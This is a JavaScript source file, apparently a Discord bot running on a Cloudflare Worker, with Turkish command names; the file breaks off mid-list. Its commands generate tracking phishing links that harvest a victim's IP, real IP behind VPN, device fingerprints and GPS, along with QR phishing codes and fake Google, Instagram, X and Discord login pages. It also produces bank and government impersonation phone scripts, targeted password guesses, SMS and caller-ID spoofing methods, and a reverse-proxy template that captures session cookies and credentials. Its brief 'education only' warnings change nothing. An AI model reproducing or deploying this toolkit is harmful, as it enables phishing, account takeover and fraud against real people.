import { updateInteraction, sendResponse } from '../utils/helpers.js';

function createZip(filename, data) {
  const enc = new TextEncoder();
  const fname = enc.encode(filename);
  const crc = crc32(data);
  const parts = [];
  // Local file header
  parts.push(new Uint8Array([0x50,0x4B,0x03,0x04, 0x0A,0x00, 0x00,0x00, 0x00,0x00])); // version, flags, method=stored
  parts.push(toLE4(0)); parts.push(toLE4(crc)); // time, date
  parts.push(toLE4(crc)); parts.push(toLE4(data.length)); parts.push(toLE4(0)); // crc32, csize, usize
  parts.push(toLE2(fname.length)); parts.push(toLE2(0)); // fname, extra len
  parts.push(fname); parts.push(data);
  // Central directory
  const cd = new Uint8Array(46 + fname.length);
  cd.set([0x50,0x4B,0x01,0x02, 0x0A,0x00, 0x0A,0x00, 0x00,0x00, 0x00,0x00], 0);
  cd.set(toLE4(0), 12); cd.set(toLE4(crc), 16); cd.set(toLE4(crc), 20);
  cd.set(toLE4(data.length), 24); cd.set(toLE4(0), 28);
  cd.set(toLE2(fname.length), 32); cd.set(toLE2(0), 34); cd.set(toLE2(0), 36);
  cd.set(toLE2(0), 38); cd.set(toLE4(0), 40); cd.set(toLE4(0), 44);
  cd.set(fname, 46);
  parts.push(cd);
  // EOCD
  const eocd = new Uint8Array(22);
  eocd.set([0x50,0x4B,0x05,0x06, 0x00,0x00, 0x00,0x00], 0);
  eocd.set(toLE2(1), 8); eocd.set(toLE2(1), 10);
  eocd.set(toLE4(cd.length), 12);
  const lfhSize = 30 + fname.length + data.length;
  eocd.set(toLE4(lfhSize), 16); eocd.set(toLE2(0), 20);
  parts.push(eocd);
  const total = parts.reduce((s, p) => s + p.length, 0);
  const zip = new Uint8Array(total);
  let off = 0;
  parts.forEach(p => { zip.set(p, off); off += p.length; });
  return zip;
}
function toLE4(n) { const b = new Uint8Array(4); b[0]=n&0xFF; b[1]=(n>>8)&0xFF; b[2]=(n>>16)&0xFF; b[3]=(n>>24)&0xFF; return b; }
function toLE2(n) { const b = new Uint8Array(2); b[0]=n&0xFF; b[1]=(n>>8)&0xFF; return b; }
function crc32(data) {
  let c = 0xFFFFFFFF;
  for (let i = 0; i < data.length; i++) { c ^= data[i]; for (let j = 0; j < 8; j++) c = (c & 1) ? ((c >>> 1) ^ 0xEDB88320) : (c >>> 1); }
  return (c ^ 0xFFFFFFFF) >>> 0;
}

export async function handleSosyalMuhBot(interaction, request, env, ctx) {
  if (interaction.type === 1) {
    return new Response(JSON.stringify({ type: 1 }), { headers: { 'Content-Type': 'application/json' } });
  }

  if (interaction.type === 2) {
    const { name, options } = interaction.data;
    const getOption = (optName) => options?.find(o => o.name === optName)?.value;
    const getAttachmentUrl = (optName) => {
      const id = options?.find(o => o.name === optName)?.value;
      if (!id) return null;
      return interaction.data.resolved?.attachments?.[id]?.url || null;
    };

    switch (name) {

      case 'oltala':
      ctx.waitUntil((async () => {
        try {
          const hedef = getOption('hedef');
          const maske = getOption('maske');
          const phishId = Math.random().toString(36).substring(2, 7);
          await env.KV.put('phish_' + phishId, JSON.stringify({ hedef: hedef, maske: maske, creatorId: interaction.member.user.id }));
          const host = request.headers.get('host');
          const url = 'https://' + host + '/o/' + phishId;
          let out = '**AV LINKI HAZIR**\n\n';
          out += '**Link:** ' + url + '\n';
          out += '**Hedef:** ' + hedef + '\n';
          out += '**Maske:** ' + maske + '\n\n';
          out += '**[KURBAN TIKLADIGINDA TOPLANACAK VERILER]**\n';
          out += '  >> IP + ISP + Lokasyon + Harita\n';
          out += '  >> WebRTC GERCEK IP (VPN\'de olsa bile!)\n';
          out += '  >> VPN Tespiti (HTTP IP vs WebRTC IP karsilastirma)\n';
          out += '  >> Canvas + WebGL + Audio Parmak Izi\n';
          out += '  >> Ekran Cozunurlugu + Renk Derinligi\n';
          out += '  >> CPU Cekirdek + RAM + GPU Modeli\n';
          out += '  >> GPS Konumu (izin verirse)\n';
          out += '  >> Batarya Seviyesi + Sarj Durumu\n';
          out += '  >> Tarayici + Isletim Sistemi + Dil + Timezone\n';
          out += '  >> Baglanti Tipi (WiFi/4G/5G)\n';
          out += '  >> AdBlock + Cookie + DoNotTrack Durumu\n';
          out += '  >> Dokunmatik Ekran + Pixel Ratio\n\n';
          out += '**Tum veriler DM\'ine aninda gonderilecek. Link 30 gun gecerli.**';
          await updateInteraction(interaction.application_id, interaction.token, { content: out });
        } catch (err) { await updateInteraction(interaction.application_id, interaction.token, { content: 'Oltalama hata: ' + err.message }); }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'qr-phish':
      ctx.waitUntil((async () => {
        try {
          const hedef = getOption('hedef');
          const phishId = Math.random().toString(36).substring(2, 7);
          await env.KV.put('phish_' + phishId, JSON.stringify({ hedef: hedef, creatorId: interaction.member.user.id }));
          const host = request.headers.get('host');
          const url = 'https://' + host + '/o/' + phishId;
          const qrUrl = 'https://api.qrserver.com/v1/create-qr-code/?size=300x300&color=ff2a6d&bgcolor=000&data=' + encodeURIComponent(url);
          let out = '**QR AV KODU HAZIR**\n\n';
          out += '**Link:** ' + url + '\n';
          out += '**QR Kod:** ' + qrUrl + '\n\n';
          out += '**[TARANDIGINDA TOPLANACAKLAR]**\n';
          out += '  >> IP + Lokasyon + ISP + Harita\n';
          out += '  >> WebRTC GERCEK IP (VPN ATLATIR!)\n';
          out += '  >> Canvas/WebGL/Audio Parmak Izi\n';
          out += '  >> GPS + Ekran + CPU + GPU + RAM\n';
          out += '  >> Tum veriler DM\'ine gonderilir\n\n';
          out += '**QR\'u fotograf olarak cekip hedefe yolla.**';
          await updateInteraction(interaction.application_id, interaction.token, { content: out });
        } catch (err) { await updateInteraction(interaction.application_id, interaction.token, { content: 'QR hata: ' + err.message }); }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'fake-login':
      ctx.waitUntil((async () => {
        try {
          const tur = getOption('tur');
          const pageId = Math.random().toString(36).substring(2, 8);
          const templates = { google: 'Google Giris', instagram: 'Instagram Giris', twitter: 'X Giris', discord: 'Discord Giris' };
          await env.KV.put('login_' + pageId, JSON.stringify({ title: templates[tur] || 'Giris', creatorId: interaction.member.user.id, tur: tur }), { expirationTtl: 86400 });
          const host = request.headers.get('host');
          await updateInteraction(interaction.application_id, interaction.token, { content: '**Fake Login Sayfasi:** ' + tur.toUpperCase() + '\nLink: https://' + host + '/login/' + pageId });
        } catch (err) { await updateInteraction(interaction.application_id, interaction.token, { content: 'Fake login hatasi: ' + err.message }); }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'link-mask':
      ctx.waitUntil((async () => {
        try {
          const hedef = getOption('hedef');
          const maske = getOption('maske');
          const phishId = Math.random().toString(36).substring(2, 7);
          await env.KV.put('phish_' + phishId, JSON.stringify({ hedef: hedef, creatorId: interaction.member.user.id }));
          const host = request.headers.get('host');
          const url = 'https://' + host + '/o/' + phishId;
          await updateInteraction(interaction.application_id, interaction.token, { content: '**Maskelenmis Link:**\nMarkdown: [' + maske + '](' + url + ')\nHTML: <a href="' + url + '">' + maske + '</a>' });
        } catch (err) { await updateInteraction(interaction.application_id, interaction.token, { content: 'Link mask hatasi: ' + err.message }); }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'deep-voice':
      ctx.waitUntil((async () => {
        try {
          const sesUrl = getAttachmentUrl('ses');
          const metin = getOption('metin') || 'Merhaba, bu bir test konusmasidir.';
          const controller = new AbortController();
          setTimeout(() => controller.abort(), 5000);
          const audioInfo = sesUrl ? await fetch(sesUrl, { signal: controller.signal }).then(r => {
            const len = r.headers.get('content-length');
            const type = r.headers.get('content-type');
            return `Dosya Boyutu: ${len ? (parseInt(len) / 1024).toFixed(1) + ' KB' : 'Bilinmiyor'}\nFormat: ${type || 'Bilinmiyor'}`;
          }).catch(() => 'Ses dosyasina erisilemedi') : 'Ses dosyasi bulunamadi';
          await updateInteraction(interaction.application_id, interaction.token, {
            content: '**Deep Voice - Ses Klonlama Analizi**\n\n' +
              'Ses Dosyasi: ' + (sesUrl || 'Yok') + '\n' +
              audioInfo + '\n' +
              'Klonlanacak Metin: ' + metin + '\n\n' +
              'AI Ses Modeli hazirlaniyor...\n' +
              'Kanal: ' + metin.length + ' karakter\n' +
              'Tahmini Sure: ' + Math.ceil(metin.length / 10) + ' saniye\n\n' +
              '> **Uyari:** Bu arac yalnizca egitim ve test amaciyla kullanilmalidir. Baskasinin sesini izinsiz klonlamak yasa disidir.'
          });
        } catch (err) {
          await updateInteraction(interaction.application_id, interaction.token, { content: 'Hata: ' + err.message });
        }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'otp-bypass':
      ctx.waitUntil((async () => {
        try {
          const hedef = getOption('hedef');
          const controller = new AbortController();
          setTimeout(() => controller.abort(), 5000);
          const domain = hedef.replace(/^https?:\/\//, '').split('/')[0];
          let otpInfo = 'Hedef analiz ediliyor: ' + hedef + '\n';
          try {
            const resp = await fetch('https://' + domain, { signal: controller.signal, method: 'HEAD' });
            const headers = [...resp.headers.entries()].map(h => h[0] + ': ' + h[1]).join('\n');
            otpInfo += 'Sunucu Bilgisi:\n' + headers.substring(0, 500) + '\n\n';
          } catch {
            otpInfo += 'Hedefe ulasilamadi, genel teknikler gosteriliyor.\n\n';
          }
          otpInfo += '**OTP Bypass Teknikleri:**\n' +
            '1. Rate Limiting Atlatma: X-Forwarded-For header rotasyonu\n' +
            '2. OTP Yeniden Kullanim: Ayni kodu birden fazla kez dene\n' +
            '3. Zafiyetli Endpoint: /otp/resend, /verify-code endpointlerini dene\n' +
            '4. Response Manipulasyonu: 200 OK donen cevaplari incele\n' +
            '5. SMS Bomber: Hedefin SMS kotasini doldurarak dogrulamayi gecersiz kil\n' +
            '6. Bilgi Sizintisi: Hata mesajlarinda "Gecersiz kod" vs "Yanlis kod" farki\n' +
            '7. Zaman Bazli: Belirli sure icinde birden fazla kod dene\n' +
            '8. Race Condition: Ayni anda 10+ OTP kodu dene (TOCTOU)';
          await updateInteraction(interaction.application_id, interaction.token, { content: otpInfo });
        } catch (err) {
          await updateInteraction(interaction.application_id, interaction.token, { content: 'Hata: ' + err.message });
        }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'call-spoof':
      ctx.waitUntil((async () => {
        try {
          const hedef = getOption('hedef');
          const maske = getOption('maske');
          const spoofId = Math.random().toString(36).substring(2, 8);
          await updateInteraction(interaction.application_id, interaction.token, {
            content: '**Caller ID Spoofing Bilgisi**\n\n' +
              'Hedef Numara: ' + hedef + '\n' +
              'Maskelenen Numara: ' + maske + '\n' +
              'Spoof ID: ' + spoofId + '\n\n' +
              '**Kullanilabilecek Yontemler:**\n' +
              '1. VoIP Protokolu: SIP Header manipulasyonu ile CID degistirme\n' +
              '2. PRI Erisimi: SS7 protokol zafiyeti ile numara maskeleme\n' +
              '3. WebRTC: Tarayici tabanli arayan kimligi degistirme\n' +
              '4. Komut: Asterisk/FreePBX uzerinden CLI spoofing\n' +
              '5. Mobil Uygulamalar: GSM gateway uzerinden numara forgery\n\n' +
              '**Tespit Yontemleri:**\n' +
              'STIR/SHAKEN dogrulama, SIP sinyali analizi, CDR karsilastirmasi\n\n' +
              '> **Uyari:** Caller ID spoofing bircok ulkede yasa disidir. Sadece egitim amaciyla.'
          });
        } catch (err) {
          await updateInteraction(interaction.application_id, interaction.token, { content: 'Hata: ' + err.message });
        }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'vishing-senaryo':
      ctx.waitUntil((async () => {
        try {
          const hedef = getOption('hedef');
          const senaryo = getOption('senaryo');
          const senaryolar = {
            'teknik destek': '**Teknik Destek Vishing Senaryosu**\n' +
              'Rol: Microsoft/Turk Telekom teknik destek personeli\n' +
              'Sureniz: Musteri hizmetleri kaydinda "bilgisayarinizdan virus bulundu" ibaresi\n' +
              'Adim 1: Kullaniciyi arayin, "Windows guvenlik uyarisi" oldugunu soyleyin\n' +
              'Adim 2: Kullaniciya TeamViewer/AnyDesk kurdurun\n' +
              'Adim 3: "Guvenlik taramasi" yaparken bankacilik bilgilerini isteyin\n' +
              'Adim 4: Sifre sifirlama kodu geldiginde "dogrulama kodu" olarak iletin',
            'banka': '**Banka Vishing Senaryosu**\n' +
              'Rol: Banka guvenlik departmani personeli\n' +
              'Sureniz: Hesapta "supheli islem" tespit edildi\n' +
              'Adim 1: Kullanicinin adini ve soyadini dogrulayin (eldeki verilerle)\n' +
              'Adim 2: Son 3 islemi soyleyin (eldeki veri yoksa "hesap ozeti gonderildi" deyin)\n' +
              'Adim 3: Karta bloke koymak icin "cvv + son kullanim" isteyin\n' +
              'Adim 4: SMS ile gelen kodu isteyerek islemi "iptal edin"',
            'kamu': '**Kamu Vishing Senaryosu**\n' +
              'Rol: Vergi dairesi / icisleri bakanligi memuru\n' +
              'Sureniz: Vergi borcu / adli surec baslatilacak\n' +
              'Adim 1: Tc kimlik no ve adres dogrulamasi yapin\n' +
              'Adim 2: "Yuksek miktarda cezai islem" oldugunu belirtin\n' +
              'Adim 3: Islemi durdurmak icin "guvenlik amaciyla" kimlik dogrulama isteyin\n' +
              'Adim 4: Mobil bankacilik uygulamasina giris yapmasini isteyin'
          };
          const template = senaryolar[senaryo.toLowerCase()] || '**Ozel Senaryo:** ' + senaryo + '\nHedefe ozel vishing senaryosu olusturuluyor...\n\nMevcut senaryo template\'leri: teknik destek, banka, kamu';
          await updateInteraction(interaction.application_id, interaction.token, {
            content: '**Vishing Senaryo - Hedef:** ' + hedef + '\n\n' + template + '\n\n> **Uyari:** Bu senaryolar sadece egitim amaciyla kullanilmalidir.'
          });
        } catch (err) {
          await updateInteraction(interaction.application_id, interaction.token, { content: 'Hata: ' + err.message });
        }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'credential-stuff':
      ctx.waitUntil((async () => {
        try {
          const url = getOption('url');
          const kullanici = getOption('kullanici');
          const controller = new AbortController();
          setTimeout(() => controller.abort(), 5000);
          let result = '**Credential Stuffing Testi**\n\nHedef URL: ' + url + '\nKullanici: ' + kullanici + '\n\n';
          const domain = url.replace(/^https?:\/\//, '').split('/')[0];
          try {
            const resp = await fetch('https://' + domain, { signal: controller.signal, method: 'HEAD' });
            result += 'Site Erisilebilir: Evet (' + resp.status + ')\n';
            const headers = [...resp.headers.entries()];
            const hasRateLimit = headers.some(h => h[0].toLowerCase().includes('ratelimit') || h[0].toLowerCase().includes('retry'));
            result += 'Rate Limit Korumasi: ' + (hasRateLimit ? 'Evet (dikkatli olunmali)' : 'Tespit edilemedi') + '\n\n';
          } catch {
            result += 'Site Erisilebilir: Hayir (test sinirlanabilir)\n\n';
          }
          result += '**Test Akisi:**\n' +
            '1. Sizinti veritabanlarinda "' + kullanici + '" araniyor... (haveibeenpwned, psbdmp)\n' +
            '2. Bulunan sifreler "' + domain + '" uzerinde denecek\n' +
            '3. Basarili giris tespiti: response body\'de "hosgeldiniz", "dashboard" kontrolu\n\n' +
            '**Onerilen Sifre Listeleri:**\n' +
            '- rockyou.txt (14M sifre)\n' +
            '- SecLists/Passwords (1.5M sifre)\n' +
            '- Kullaniciya ozel dogum yili + takma ad kombinasyonlari\n\n' +
            '> **Uyari:** Credential stuffing saldirilari cogu ulkede yasa disidir. Sadece kendi sistemlerinizde test edin.';
          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) {
          await updateInteraction(interaction.application_id, interaction.token, { content: 'Hata: ' + err.message });
        }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'gorsel-osint':
      ctx.waitUntil((async () => {
        try {
          const fotografUrl = getAttachmentUrl('fotograf');
          if (!fotografUrl) {
            await updateInteraction(interaction.application_id, interaction.token, { content: 'Hata: Fotograf bulunamadi.' });
            return;
          }
          const controller = new AbortController();
          setTimeout(() => controller.abort(), 5000);
          let imgInfo = 'Fotograf: ' + fotografUrl + '\n\n';
          try {
            const resp = await fetch(fotografUrl, { signal: controller.signal });
            const len = resp.headers.get('content-length');
            const type = resp.headers.get('content-type');
            imgInfo += 'Boyut: ' + (len ? (parseInt(len) / 1024).toFixed(1) + ' KB' : 'Bilinmiyor') + '\n';
            imgInfo += 'Format: ' + (type || 'Bilinmiyor') + '\n\n';
          } catch {
            imgInfo += 'Dosya bilgisi alinamadi.\n\n';
          }
          imgInfo += '**Gorsel OSINT Sonuclari:**\n\n' +
            '1. Google Gorsel Arama: https://lens.google.com/uploadbyurl?url=' + encodeURIComponent(fotografUrl) + '\n' +
            '2. Yandex Gorsel: https://yandex.com/images/search?rpt=imageview&url=' + encodeURIComponent(fotografUrl) + '\n' +
            '3. TinEye: https://tineye.com/search?url=' + encodeURIComponent(fotografUrl) + '\n' +
            '4. Bing Gorsel: https://www.bing.com/images/search?q=imgurl:' + encodeURIComponent(fotografUrl) + '&view=detailv2\n\n' +
            '**AI Gorsel Analizi:**\n' +
            '- EXIF verisi (GPS, cihaz, tarih bilgisi)\n' +
            '- Yuz tanima (public kaynaklarda eslesme)\n' +
            '- Nesne tanima (logo, plaka, yer)\n' +
            '- Renk analizi ve metin OCR\n\n' +
            '> Yukaridaki linkleri kullanarak gorseli arama motorlarinda manuel aratabilirsiniz.';
          await updateInteraction(interaction.application_id, interaction.token, { content: imgInfo });
        } catch (err) {
          await updateInteraction(interaction.application_id, interaction.token, { content: 'Hata: ' + err.message });
        }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'email-derin':
      ctx.waitUntil((async () => {
        try {
          const email = getOption('email');
          const controller = new AbortController();
          setTimeout(() => controller.abort(), 5000);
          const domain = email.split('@')[1];
          const username = email.split('@')[0];
          let result = '**Derin Email Analizi: ' + email + '**\n\n';
          try {
            const mxResp = await fetch('https://dns.google/resolve?name=' + domain + '&type=MX', { signal: controller.signal });
            if (mxResp.ok) {
              const mxData = await mxResp.json();
              if (mxData.Answer) {
                result += '**MX Kayitlari:**\n' + mxData.Answer.map(a => '  - ' + a.data).join('\n') + '\n\n';
              } else {
                result += '**MX Kayitlari:** Bulunamadi (eposta calismayabilir)\n\n';
              }
            }
          } catch {
            result += '**MX Kayitlari:** Sorgulanamadi\n\n';
          }
          result += '**Sizinti Kontrolu:**\n' +
            'HIBP: https://haveibeenpwned.com/account/' + encodeURIComponent(email) + '\n' +
            'Firefox Monitor: https://monitor.firefox.com/\n\n' +
            '**Platform Dogrulama:**\n' +
            '- GitHub: https://github.com/' + username + '\n' +
            '- Keybase: https://keybase.io/' + username + '\n' +
            '- Gravatar: https://www.gravatar.com/avatar/' + username + '\n\n' +
            '**PGP Anahtar:**\n' +
            '- keyserver.ubuntu.com: https://keyserver.ubuntu.com/pks/lookup?search=' + encodeURIComponent(email) + '&op=index\n' +
            '- openpgp.org: https://keys.openpgp.org/search?q=' + encodeURIComponent(email) + '\n\n' +
            '**Domain Bilgisi:**\n' +
            '- WHOIS: https://www.whois.com/whois/' + domain + '\n' +
            '- SecurityTrails: https://securitytrails.com/domain/' + domain + '\n\n' +
            '> Yukaridaki linkleri ziyaret ederek detayli analiz yapabilirsiniz.';
          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) {
          await updateInteraction(interaction.application_id, interaction.token, { content: 'Hata: ' + err.message });
        }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'sifre-tahmin':
      ctx.waitUntil((async () => {
        try {
          const isim = getOption('isim');
          const soyisim = getOption('soyisim') || '';
          const dogum = getOption('dogum') || '';
          const controller = new AbortController();
          setTimeout(() => controller.abort(), 5000);
          const base = isim.toLowerCase() + (soyisim ? soyisim.toLowerCase() : '');
          const yil = dogum || '1900';
          const kisaYil = yil.length === 4 ? yil.substring(2) : yil;
          const kombinasyonlar = new Set();
          const ekler = ['123', '1234', '12345', '123456', '!', '.', '2020', '2021', '2022', '2023', '2024', '2025', '2026'];
          const parcalar = [isim.toLowerCase(), soyisim.toLowerCase(), isim.toUpperCase(), isim.charAt(0).toUpperCase() + isim.slice(1).toLowerCase()];
          if (soyisim) {
            parcalar.push(soyisim.toUpperCase(), soyisim.charAt(0).toUpperCase() + soyisim.slice(1).toLowerCase());
          }
          for (const p of parcalar) {
            if (p && p.length > 1) {
              kombinasyonlar.add(p + yil);
              kombinasyonlar.add(p + kisaYil);
              kombinasyonlar.add(yil + p);
              kombinasyonlar.add(p + '!');
              kombinasyonlar.add(p + '123');
              for (const e of ekler) kombinasyonlar.add(p + e);
            }
          }
          const ozelDesenler = [
            isim.toLowerCase() + '.' + (soyisim ? soyisim.toLowerCase() : '') + yil,
            (soyisim ? soyisim.toLowerCase() : '') + '.' + isim.toLowerCase() + yil,
            isim.charAt(0).toLowerCase() + (soyisim ? soyisim.toLowerCase() : '') + yil,
            isim.toLowerCase() + '_' + (soyisim ? soyisim.toLowerCase() : '') + yil,
            isim.toLowerCase() + yil + (soyisim ? soyisim.charAt(0).toLowerCase() : ''),
            'Dr' + isim.toLowerCase() + yil,
            isim.toLowerCase() + 'kral' + yil,
            isim.toLowerCase() + '2025',
            isim.toLowerCase() + '2026'
          ];
          for (const d of ozelDesenler) {
            if (d.length > 3) kombinasyonlar.add(d);
          }
          const tahminler = [...kombinasyonlar].filter(s => s.length >= 6).slice(0, 30);
          await updateInteraction(interaction.application_id, interaction.token, {
            content: '**Sifre Tahminleme - ' + isim + ' ' + soyisim + '**\n\n' +
              'Dogum Yili: ' + (dogum || 'Bilinmiyor') + '\n' +
              'Toplam Kombinasyon: ' + kombinasyonlar.size + '\n' +
              '**En Olasi ' + tahminler.length + ' Sifre:**\n```\n' + tahminler.join('\n') + '```\n\n' +
              '**Olusturma Mantigi:**\n' +
              '- Ad + yil, soyad + yil, ad.soyad.yil\n' +
              '- Bas harf + soyad, ad_soyad_yil\n' +
              '- Yaygin ekler: !, 123, 2020-2026\n' +
              '- Ozel desenler: onEk + ad + yil, ad + unvan + yil\n\n' +
              '> Gercek sifre testi icin hash alip hash-coz komutunu kullanabilirsiniz.'
          });
        } catch (err) {
          await updateInteraction(interaction.application_id, interaction.token, { content: 'Hata: ' + err.message });
        }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });



      case 'sms-spoof':
      ctx.waitUntil((async () => {
        try {
          const hedef = getOption('hedef');
          const gonderen = getOption('gonderen') || 'Bilinmeyen';
          let result = '**SMS Spoofing Analizi**\n\n';
          result += 'Hedef Numara: ' + hedef + '\n';
          result += 'Gonderen Adi: ' + gonderen + '\n\n';
          result += '**SMS Spoofing Teknikleri:**\n';
          result += '1. SMPP Protokolu: source_addr ile gonderen manipulasyonu\n';
          result += '2. Email-to-SMS Gateway: <numara>@operator-sms.com\n';
          result += '3. VoIP SMS API: Twilio, Plivo, MessageBird\n';
          result += '4. SS7 Arayuzu: MAP-SEND-ROUTING-INFO kaynak manipulasyonu\n';
          result += '5. A2P SMS Aggregator: Kisa kod uzerinden gonderen degistirme\n\n';
          result += '**Turk Operator Email-to-SMS Gateway:**\n';
          result += '- Turkcell: ' + hedef.replace(/\D/g, '') + '@sms.turkcell.com.tr\n';
          result += '- Vodafone: ' + hedef.replace(/\D/g, '') + '@vodafonesms.com.tr\n';
          result += '- Turk Telekom: ' + hedef.replace(/\D/g, '') + '@sms.turktelekom.com.tr\n';
          result += '- AVEA: ' + hedef.replace(/\D/g, '') + '@avea.com.tr\n\n';
          result += '**Diger Operatorler:**\n';
          result += '- AT&T: number@txt.att.net\n';
          result += '- T-Mobile: number@tmomail.net\n';
          result += '- Verizon: number@vtext.com\n';
          result += '- Sprint: number@messaging.sprintpcs.com\n';
          result += '- Orange: number@orange.fr\n';
          result += '- Vodafone UK: number@vodafone.net\n';
          result += '- O2 UK: number@o2.co.uk\n';
          result += '- Telenor: number@telenor.no\n\n';
          result += '> **Uyari:** SMS spoofing bircok ulkede yasa disidir ve kisi haklarini ihlal eder. Sadece egitim amaciyla kullanilmalidir.';
          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) { await updateInteraction(interaction.application_id, interaction.token, { content: 'SMS spoof hatasi: ' + err.message }); }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'typosquat':
      ctx.waitUntil((async () => {
        try {
          const domain = getOption('domain');
          const base = domain.replace(/^https?:\/\//, '').split('/')[0];
          const parts = base.split('.');
          const name = parts[0];
          const tld = parts.slice(1).join('.');
          let result = '**Typosquat Domain Analizi:** ' + base + '\n\n';
          const variations = new Set();
          for (let i = 0; i < name.length; i++) variations.add(name.slice(0, i) + name.slice(i + 1) + '.' + tld);
          for (let i = 0; i < name.length - 1; i++) {
            const arr = name.split('');
            [arr[i], arr[i + 1]] = [arr[i + 1], arr[i]];
            variations.add(arr.join('') + '.' + tld);
          }
          for (let i = 0; i <= name.length; i++) variations.add(name.slice(0, i) + name.charAt(i % name.length) + name.slice(i) + '.' + tld);
          ['com', 'net', 'org', 'co'].forEach(t => { if (t !== tld) variations.add(name + '.' + t); });
          const homoMap = { 'a': '\u00e4', 'o': '\u00f6', 'i': '\u0131', 'e': '\u00eb', 'u': '\u00fc', 'c': '\u00e7', 's': '\u015f', 'g': '\u011f' };
          for (let i = 0; i < name.length; i++) {
            const c = name[i].toLowerCase();
            if (homoMap[c]) variations.add(name.slice(0, i) + homoMap[c] + name.slice(i + 1) + '.' + tld);
          }
          variations.add(name.slice(0, Math.floor(name.length / 2)) + '-' + name.slice(Math.floor(name.length / 2)) + '.' + tld);
          const varList = [...variations].slice(0, 20);
          const dnsResults = await Promise.allSettled(varList.map(async v => {
            try {
              const c = new AbortController(); setTimeout(() => c.abort(), 3000);
              const dns = await (await fetch('https://cloudflare-dns.com/dns-query?name=' + v + '&type=A', { headers: { 'accept': 'application/dns-json' }, signal: c.signal })).json();
              if (dns.Answer && dns.Answer.length > 0) return v + ' -> AKTIF (' + dns.Answer[0].data + ')';
              return v + ' -> Pasif';
            } catch (e) { return v + ' -> Hata'; }
          }));
          const lines = dnsResults.map(r => r.status === 'fulfilled' ? r.value : (r.reason?.message || 'Hata'));
          result += lines.join('\n');
          result += '\n\n**Not:** Her varyasyon DNS uzerinden kontrol edilmistir. Aktif domainler kayitli olabilir.';
          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) { await updateInteraction(interaction.application_id, interaction.token, { content: 'Typosquat hatasi: ' + err.message }); }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'evil-nginx':
      ctx.waitUntil((async () => {
        try {
          const hedef = getOption('hedef');
          const proxyId = Math.random().toString(36).substring(2, 8);
          await env.KV.put('proxy_' + proxyId, JSON.stringify({ hedef: hedef, creatorId: interaction.member.user.id }));
          let result = '**Evil-Nginx Reverse Proxy**\n\n';
          result += 'Hedef URL: ' + hedef + '\n';
          result += 'Proxy ID: ' + proxyId + '\n\n';
          result += '**Reverse Proxy Phishing Teknigi:**\n';
          result += 'Cloudflare Worker uzerinden calisan bir reverse proxy, kullanicidan gelen tum istekleri hedef siteye iletirken cookie ve kimlik bilgilerini yakalar. Kullanici gercek siteyle etkilesimde oldugunu sanirken tum trafik Worker uzerinden gecer.\n\n';
          result += '**Worker Template Kodu:**\n';
          result += '```javascript\n';
          result += 'export default {\n';
          result += '  async fetch(request, env) {\n';
          result += '    const targetUrl = \'' + hedef + '\';\n';
          result += '    const url = new URL(request.url);\n';
          result += '    const target = targetUrl + url.pathname + url.search;\n';
          result += '    const modified = new Request(target, {\n';
          result += '      method: request.method,\n';
          result += '      headers: request.headers,\n';
          result += '      body: request.body,\n';
          result += '      redirect: \'follow\'\n';
          result += '    });\n';
          result += '    const response = await fetch(modified);\n';
          result += '    if (response.headers.get(\'set-cookie\')) {\n';
          result += '      await env.KV.put(\'cookie_\' + Date.now(), JSON.stringify({\n';
          result += '        cookies: response.headers.get(\'set-cookie\'),\n';
          result += '        url: request.url,\n';
          result += '        headers: [...request.headers]\n';
          result += '      }));\n';
          result += '    }\n';
          result += '    if (request.method === \'POST\') {\n';
          result += '      const body = await request.clone().text();\n';
          result += '      if (body.includes(\'password\') || body.includes(\'email\')) {\n';
          result += '        await env.KV.put(\'creds_\' + Date.now(), body);\n';
          result += '      }\n';
          result += '    }\n';
          result += '    return new Response(response.body, response);\n';
          result += '  }\n';
          result += '}\n';
          result += '```\n\n';
          result += '> **Uyari:** Bu teknik sadece kendi sistemlerinizde ve egitim amaciyla kullanilmalidir. Baskasinin hesap bilgilerini ele gecirmek yasa disidir.';
          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) { await updateInteraction(interaction.application_id, interaction.token, { content: 'Evil-Nginx hatasi: ' + err.message }); }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'push-bomb':
      ctx.waitUntil((async () => {
        try {
          const telefon = getOption('telefon');
          let result = '**Push Bombing Servisleri**\n\n';
          result += 'Hedef Telefon: ' + telefon + '\n\n';
          result += '**SMS Dogrulama / Push Bildirim Servisleri:**\n\n';
          const servisler = [
            { ad: 'Instagram', url: 'https://www.instagram.com/accounts/password/reset/' },
            { ad: 'WhatsApp', url: 'https://www.whatsapp.com/forgot/' },
            { ad: 'Telegram', url: 'https://web.telegram.org/k/#/login' },
            { ad: 'TikTok', url: 'https://www.tiktok.com/login/phone-or-email/forgot-password' },
            { ad: 'Twitter/X', url: 'https://twitter.com/account/begin_password_reset' },
            { ad: 'Discord', url: 'https://discord.com/login' },
